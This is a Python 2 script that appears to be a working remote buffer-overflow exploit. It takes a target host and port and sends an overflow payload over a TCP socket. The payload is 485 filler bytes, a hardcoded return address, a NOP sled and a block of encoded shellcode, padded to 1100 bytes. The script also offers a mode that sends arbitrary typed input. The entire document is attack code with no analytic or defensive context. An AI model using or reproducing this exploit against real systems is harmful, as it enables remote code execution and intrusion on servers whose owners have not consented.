import socket
import sys

target = sys.argv[1]
port = int(sys.argv[2])


buf = (
"\xb8\x9c\x9b\xd9\xaf\xda\xcd\xd9\x74\x24\xf4\x5b\x2b\xc9" +
"\xb1\x4f\x31\x43\x14\x03\x43\x14\x83\xeb\xfc\x7e\x6e\x25" +
"\x47\xf7\x91\xd6\x98\x67\x1b\x33\xa9\xb5\x7f\x37\x98\x09" +
"\x0b\x15\x11\xe2\x59\x8e\xa2\x86\x75\xa1\x03\x2c\xa0\x8c" +
"\x94\x81\x6c\x42\x56\x80\x10\x99\x8b\x62\x28\x52\xde\x63" +
"\x6d\x8f\x11\x31\x26\xdb\x80\xa5\x43\x99\x18\xc4\x83\x95" +
"\x21\xbe\xa6\x6a\xd5\x74\xa8\xba\x46\x03\xe2\x22\xec\x4b" +
"\xd3\x53\x21\x88\x2f\x1d\x4e\x7a\xdb\x9c\x86\xb3\x24\xaf" +
"\xe6\x1f\x1b\x1f\xeb\x5e\x5b\x98\x14\x15\x97\xda\xa9\x2d" +
"\x6c\xa0\x75\xb8\x71\x02\xfd\x1a\x52\xb2\xd2\xfc\x11\xb8" +
"\x9f\x8b\x7e\xdd\x1e\x58\xf5\xd9\xab\x5f\xda\x6b\xef\x7b" +
"\xfe\x30\xab\xe2\xa7\x9c\x1a\x1b\xb7\x79\xc2\xb9\xb3\x68" +
"\x17\xbb\x99\xe4\xd4\xf1\x21\xf5\x72\x82\x52\xc7\xdd\x38" +
"\xfd\x6b\x95\xe6\xfa\x8c\x8c\x5e\x94\x72\x2f\x9e\xbc\xb0" +
"\x7b\xce\xd6\x11\x04\x85\x26\x9d\xd1\x09\x77\x31\x8a\xe9" +
"\x27\xf1\x7a\x81\x2d\xfe\xa5\xb1\x4d\xd4\xd3\xf6\xda\x17" +
"\x4b\x7b\x9b\xf0\x8e\x7b\x8d\x5c\x06\x9d\xc7\x4c\x4e\x36" +
"\x70\xf4\xcb\xcc\xe1\xf9\xc1\x44\x81\x68\x8e\x94\xcc\x90" +
"\x19\xc3\x99\x67\x50\x81\x37\xd1\xca\xb7\xc5\x87\x35\x73" +
"\x12\x74\xbb\x7a\xd7\xc0\x9f\x6c\x21\xc8\x9b\xd8\xfd\x9f" +
"\x75\xb6\xbb\x49\x34\x60\x12\x25\x9e\xe4\xe3\x05\x21\x72" +
"\xec\x43\xd7\x9a\x5d\x3a\xae\xa5\x52\xaa\x26\xde\x8e\x4a" +
"\xc8\x35\x0b\x6a\x2b\x9f\x66\x03\xf2\x4a\xcb\x4e\x05\xa1" +
"\x08\x77\x86\x43\xf1\x8c\x96\x26\xf4\xc9\x10\xdb\x84\x42" +
"\xf5\xdb\x3b\x62\xdc")


nop = '\x90' * 14
exploit = 'A' * 485 + '\x30\xa9\x55\x77' + nop + buf
padding = "C" * (1100 - len(exploit))
payload = exploit + padding

print "[+] Byte :", len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((target, port))
except:
	print "[+] Server is down"
	exit()



def At(aaa):
	try:
		s.send(aaa)
		print "Reading..."
		try:
			print s.recv(1024)
		except:
			print "\nNot Result..."
	except:
		print "[+] payload Sended..."



d = raw_input("default or manuel : ")
if d == "default":
	At(payload)
elif d == "manuel":
	mesaj = raw_input("Ci send diki :>>")
	At(mesaj)
else:
	print "[-] Answer not Found..!"
	exit()


print "[+] Done."
s.close()

